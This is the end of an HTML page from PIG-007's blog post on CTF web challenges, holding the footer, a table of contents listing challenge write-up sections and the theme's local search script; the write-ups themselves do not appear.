</div><footer class="post-footer"><div class="post-ending ending"><div class="ending__text">------ END ------</div></div><div class="post-copyright copyright"><div class="copyright-author"><span class="copyright-author__name">Author: </span><span class="copyright-author__value"><a href="http://PIG-007.github.io">PIG-007</a></span></div><div class="copyright-link"><span class="copyright-link__name">Link: </span><span class="copyright-link__value"><a href="http://pig-007.github.io/2022/08/19/Web%E6%AF%94%E8%B5%9B%E9%A2%98/">http://pig-007.github.io/2022/08/19/Web%E6%AF%94%E8%B5%9B%E9%A2%98/</a></span></div><div class="copyright-notice"><span class="copyright-notice__name">Copyright: </span><span class="copyright-notice__value">All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en" rel="external nofollow" target="_blank">BY-NC-SA</a> unless stating additionally</span></div></div><div class="post-tags"><span class="post-tags-item"><span class="post-tags-item__icon"><i class="fas fa-tag"></i></span><a class="post-tags-item__link" href="http://pig-007.github.io/tags/%E6%AF%94%E8%B5%9B/">比赛</a></span></div><nav class="post-paginator paginator"><div class="paginator-prev"><a class="paginator-prev__link" href="/2022/09/20/Leecode%E5%88%B7%E9%A2%98/"><span class="paginator-prev__icon"><i class="fas fa-angle-left"></i></span><span class="paginator-prev__text">算法笔记</span></a></div><div class="paginator-next"><a class="paginator-next__link" href="/2022/08/14/%E6%B8%97%E9%80%8F/"><span class="paginator-prev__text">渗透测试</span><span class="paginator-next__icon"><i class="fas fa-angle-right"></i></span></a></div></nav></footer></div></div></div><div class="sidebar-wrap" id="sidebar-wrap"><aside class="sidebar" id="sidebar"><div class="sidebar-nav"><span class="sidebar-nav-toc current">Catalog</span><span class="sidebar-nav-ov">Overview</span></div><section class="sidebar-toc"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#NSSCTF2022"><span class="toc-text">
          NSSCTF2022</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80%E3%80%811zweb-revenge"><span class="toc-text">
          一、1zweb(revenge)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-text">
          1.漏洞分析</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#index-php"><span class="toc-text">
          index.php</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#upload-php"><span class="toc-text">
          upload.php</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-text">
          2.漏洞利用</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C%E3%80%81ez-rce"><span class="toc-text">
          二、ez_rce</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SECCONCTF2022"><span class="toc-text">
          SECCONCTF2022</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80%E3%80%81skipinx"><span class="toc-text">
          一、skipinx</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E6%BA%90%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%EF%BC%9A"><span class="toc-text">
          1.源代码分析：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-text">
          2.漏洞分析</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%912023"><span class="toc-text">
          西湖论剑2023</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#real-ez-node"><span class="toc-text">
          real_ez_node</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E6%BC%8F%E6%B4%9E"><span class="toc-text">
          原型链污染漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%85%8D%E5%90%88ejs%E8%BF%9B%E8%A1%8CRCE"><span class="toc-text">
          配合ejs进行RCE</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SSRF%E7%9A%84%E5%88%A9%E7%94%A8"><span class="toc-text">
          SSRF的利用</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#CTF2023"><span class="toc-text">
          *CTF2023</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#jwt2struts"><span class="toc-text">
          jwt2struts</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-hash%E6%89%A9%E5%B1%95%E9%95%BF%E5%BA%A6%E6%94%BB%E5%87%BB"><span class="toc-text">
          1.hash扩展长度攻击</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-JWT%E4%BB%A4%E7%89%8C"><span class="toc-text">
          2.JWT令牌</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-struts2%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E"><span class="toc-text">
          3.struts2框架漏洞</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#DeconstruCTF"><span class="toc-text">
          DeconstruCTF</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#gitcha"><span class="toc-text">
          gitcha</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#why-are-types-weird"><span class="toc-text">
          why-are-types-weird</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#WEB%E5%B0%8F%E6%8A%80%E5%B7%A7"><span class="toc-text">
          WEB小技巧</span></a></li></ol></section><!-- ov = overview--><section class="sidebar-ov hide"><div class="sidebar-ov-author"><div class="sidebar-ov-author__avatar"><img class="sidebar-ov-author__avatar_img" src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsauthor.jpg" alt="avatar"></div><p class="sidebar-ov-author__text">The way forward</p></div><div class="sidebar-ov-state"><a class="sidebar-ov-state-item sidebar-ov-state-item--posts" href="/archives/"><div class="sidebar-ov-state-item__count">133</div><div class="sidebar-ov-state-item__name">Archives</div></a><a class="sidebar-ov-state-item sidebar-ov-state-item--categories" href="/categories/"><div class="sidebar-ov-state-item__count">83</div><div class="sidebar-ov-state-item__name">Categories</div></a><a class="sidebar-ov-state-item sidebar-ov-state-item--tags" href="/tags/"><div class="sidebar-ov-state-item__count">73</div><div class="sidebar-ov-state-item__name">Tags</div></a></div><div class="sidebar-ov-cc"><a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en" target="_blank" rel="noopener" data-popover="Creative Commons" data-popover-pos="up"><img src="/images/cc-by-nc-sa.svg"></a></div></section><div class="sidebar-reading"><div class="sidebar-reading-info"><span class="sidebar-reading-info__text">You have read </span><span class="sidebar-reading-info__num">0</span><span class="sidebar-reading-info__perc">%</span></div><div class="sidebar-reading-line"></div></div></aside></div><div class="clearfix"></div></div></main><footer class="footer" id="footer"><div class="footer-inner"><div><span>Copyright © 2023</span><span class="footer__icon"><i class="fas fa-heart"></i></span><span>PIG-007</span></div><div><span>Powered by <a href="http://hexo.io/" title="Hexo" target="_blank" rel="noopener">Hexo</a></span><span> v5.4.0</span><span class="footer__devider">|</span><span>Theme - <a href="https://github.com/liuyib/hexo-theme-stun/" title="Stun" target="_blank" rel="noopener">Stun</a></span><span> v2.6.2</span></div></div></footer><div class="loading-bar" id="loading-bar"><div class="loading-bar__progress"></div></div><div class="back2top" id="back2top"><span class="back2top__icon"><i class="fas fa-rocket"></i></span></div></div><div class="search-mask"></div><div class="search-popup"><span class="search-close"></span><div class="search-input"><input placeholder="Search for Posts (Support multiple keywords)"></div><div class="search-results"></div></div><script src="https://cdn.jsdelivr.net/npm/jquery@v3.4.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.ui.min.js"></script><script>function initSearch() {
  var isXML = true;
  var search_path = 'search.json';

  if (!search_path) {
    search_path = 'search.xml';
  } else if (/json$/i.test(search_path)) {
    isXML = false;
  }

  var path = '/' + search_path;
  $.ajax({
    url: path,
    dataType: isXML ? 'xml' : 'json',
    async: true,
    success: function (res) {
      var datas = isXML ? $('entry', res).map(function () {
        // 将 XML 转为 JSON
        return {
          title: $('title', this).text(),
          content: $('content', this).text(),
          url: $('url', this).text()
        };
      }).get() : res;
      var $input = $('.search-input input');
      var $result = $('.search-results');
      // 搜索对象（标题、内容）的权重，影响显示顺序
      var WEIGHT = { title: 100, content: 1 };
      var searchPost = function () {
        var searchText = $input.val().toLowerCase().trim();
        // 根据空白字符分隔关键字
        var keywords = searchText.split(/[\s]+/);
        // 搜索结果
        var matchPosts = [];

        // 有多个关键字时，将原文字整个保存下来
        if (keywords.length > 1) {
          keywords.push(searchText);
        }
        // 防止未输入字符时搜索
        if (searchText.length > 0) {
          datas.forEach(function (data) {
            var isMatch  = false;
            // 没有标题的文章使用预设的 i18n 变量代替
            var title = (data.title && data.title.trim()) || '[ Untitled ]';
            var titleLower = title && title.toLowerCase();
            // 删除 HTML 标签 和 所有空白字符
            var content = data.content && data.content.replace(/<[^>]+>/g, '');
            var contentLower = content && content.toLowerCase();
            // 删除重复的 /
            var postURL = data.url && decodeURI(data.url).replace(/\/{2,}/g, '/');
            // 标题中匹配到的关键词
            var titleHitSlice = [];
            // 内容中匹配到的关键词
            var contentHitSlice = [];

            keywords.forEach(function (keyword) {
              /**
              * 获取匹配的关键词的索引
              * @param {String} keyword 要匹配的关键字
              * @param {String} text 原文字
              * @param {Boolean} caseSensitive 是否区分大小写
              * @param {Number} weight 匹配对象的权重。权重大的优先显示
              * @return {Array}
              */
              function getIndexByword (word, text, caseSensitive, weight) {
                if (!word || !text) {
                  return [];
                };

                var startIndex = 0; // 每次匹配的开始索引
                var index = -1;     // 匹配到的索引值
                var result = [];    // 匹配结果

                if (!caseSensitive) {
                  word = word.toLowerCase();
                  text = text.toLowerCase();
                }

                while((index = text.indexOf(word, startIndex)) !== -1) {
                  var hasMatch = false;
                  // 索引位置相同的关键词，保留长度较长的
                  titleHitSlice.forEach(function (hit) {
                    if (hit.index === index && hit.word.length < word.length) {
                      hit.word = word;
                      hasMatch = true;
                    }
                  });
                  startIndex = index + word.length;
                  !hasMatch && result.push({ index: index, word: word, weight: weight });
                }
                return result;
              }
              titleHitSlice = titleHitSlice.concat(getIndexByword(keyword, titleLower, false, WEIGHT.title));
              contentHitSlice = contentHitSlice.concat(getIndexByword(keyword, contentLower, false, WEIGHT.content));
            });

            var hitTitle = titleHitSlice.length;
            var hitContent = contentHitSlice.length;

            if (hitTitle > 0 || hitContent > 0) {
              isMatch = true;
            }
            if (isMatch) {
              ;[titleHitSlice, contentHitSlice].forEach(function (hit) {
                // 按照匹配文字的索引的递增顺序排序
                hit.sort(function (left, right) {
                  return left.index - right.index;
                });
              });
              /**
              * 给文本中匹配到的关键词添加标记，从而进行高亮显示
              * @param {String} text 原文本
              * @param {Array} hitSlice 匹配项的索引信息
              * @param {Number} start 开始索引
              * @param {Number} end 结束索引
              * @return {String}
              */
              function highlightKeyword (text, hitSlice, start, end) {
                if (!text || !hitSlice || !hitSlice.length) {
                  return;
                }

                var result = '';
                var startIndex = start;
                var endIndex = end;
                hitSlice.forEach(function (hit) {
                  if (hit.index < startIndex) {
                    return;
                  }

                  var hitWordEnd = hit.index + hit.word.length;
                  result += text.slice(startIndex, hit.index);
                  result += '<b>' + text.slice(hit.index, hitWordEnd) + '</b>';
                  startIndex = hitWordEnd;
                });
                result += text.slice(startIndex, endIndex);
                return result;
              }

              var postData = {};
              // 文章总的搜索权重
              var postWeight = titleHitSlice.length * WEIGHT.title + contentHitSlice.length * WEIGHT.content;
              // 标记匹配关键词后的标题
              var postTitle = highlightKeyword(title, titleHitSlice, 0, title.length) || title;
              // 标记匹配关键词后的内容
              var postContent;
              // 显示内容的长度
              var SHOW_WORD_LENGTH = 200;
              // 命中关键词前的字符显示长度
              var SHOW_WORD_FRONT_LENGTH = 20;
              var SHOW_WORD_END_LENGTH = SHOW_WORD_LENGTH - SHOW_WORD_FRONT_LENGTH;

              // 截取匹配的第一个字符，前后共 200 个字符来显示
              if (contentHitSlice.length > 0) {
                var firstIndex = contentHitSlice[0].index;
                var start = firstIndex > SHOW_WORD_FRONT_LENGTH ? firstIndex - SHOW_WORD_FRONT_LENGTH : 0;
                var end = firstIndex + SHOW_WORD_END_LENGTH;
                postContent = highlightKeyword(content, contentHitSlice, start, end);
              } else { // 未匹配到内容，直接截取前 200 个字符来显示
                postContent = content.slice(0, SHOW_WORD_LENGTH);
              }
              postData.title = postTitle;
              postData.content = postContent;
              postData.url = postURL;
              postData.weight = postWeight;
              matchPosts.push(postData);
            }
          });
        }

        var resultInnerHtml = '';
        if (matchPosts.length) {
          // 按权重递增的顺序排序，使权重大的优先显示
          matchPosts.sort(function (left, right) {
            return right.weight - left.weight;
          });
          resultInnerHtml += '<ul>';
          matchPosts.forEach(function (post) {
            resultInnerHtml += '<li><a class="search-results-title" href="' + post.url + '">';
            resultInnerHtml += post.title;
            resultInnerHtml += '</a><div class="search-results-content">';
            resultInnerHtml += post.content;
            resultInnerHtml += '</div></li>';
          });
          resultInnerHtml += '</ul>';
        } else {
          resultInnerHtml += '<div class="search-results-none"><i class="far fa-meh"></i></div>';
        }
        $result.html(resultInnerHtml);
      };
      $input.on('input', searchPost);
      $input.on('keyup', function (e) {
        if (e.keyCode === Stun.utils.codeToKeyCode('Enter')) {
          searchPost();
        }
      });
    }
  });
}

function closeSearch () {
  $('body').css({ overflow: 'auto' });
  $('.search-popup').css({ display: 'none' });
  $('.search-mask').css({ display: 'none' });
}

window.addEventListener('DOMContentLoaded', function () {
  Stun.utils.pjaxReloadLocalSearch = function () {
    $('.header-nav-search').on('click', function (e) {
      e.stopPropagation();
      $('body').css('overflow', 'hidden');
      $('.search-popup')
        .velocity('stop')
        .velocity('transition.expandIn', {
          duration: 300,
          complete: function () {
            $('.search-popup input').focus();
          }
        });
      $('.search-mask')
        .velocity('stop')
        .velocity('transition.fadeIn', {
          duration: 300
        });

      initSearch();
    });
    $('.search-mask, .search-close').on('click', function () {
      closeSearch();
    });
    $(document).on('keydown', function (e) {
      // Escape <=> 27
      if (e.keyCode === Stun.utils.codeToKeyCode('Escape')) {
        closeSearch();
      }
    });
  };

  Stun.utils.pjaxReloadLocalSearch();
}, false);

function safeOpenUrl(url) {
  var newTab = window.open();
  newTab.opener = null;
  newTab.location = url;
}

function extSearch(engine) {
  var engines = {
    google: 'https://www.google.com/search?q=',
    bing: 'https://cn.bing.com/search?q=',
    baidu: 'https://www.baidu.com/s?ie=UTF-8&wd=',
  };
  var host = window.location.host;
  var query = $('.search-input input').val().toLowerCase().trim();
  var uri = engines[engine] + query + ' site:' + host;

  if (query) {
    safeOpenUrl(uri);
  } else {
    Stun.utils.popAlert('warning', 'Please enter characters');
  }
}

var assistSearchList = window.CONFIG.assistSearch;

if (Array.isArray(assistSearchList)) {
  assistSearchList.forEach(function (name) {
    document.querySelector('.search-btns-item--' + name).addEventListener('click', function () {
      extSearch(name);
    }, false);
  });
}</script><script src="/js/utils.js?v=2.6.2"></script><script src="/js/stun-boot.js?v=2.6.2"></script><script src="/js/scroll.js?v=2.6.2"></script><script src="/js/header.js?v=2.6.2"></script><script src="/js/sidebar.js?v=2.6.2"></script><script type="application/json" src="/search.json"></script><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"scale":1,"hHeadPos":0.5,"vHeadPos":0.618,"jsonPath":"/live2dw/assets/assets/wanko.model.json"},"display":{"superSample":2,"width":150,"height":300,"position":"left","hOffset":0,"vOffset":-80},"mobile":{"show":true,"scale":0.5},"react":{"opacityDefault":0.7,"opacityOnHover":0.8},"log":false});</script></body></html>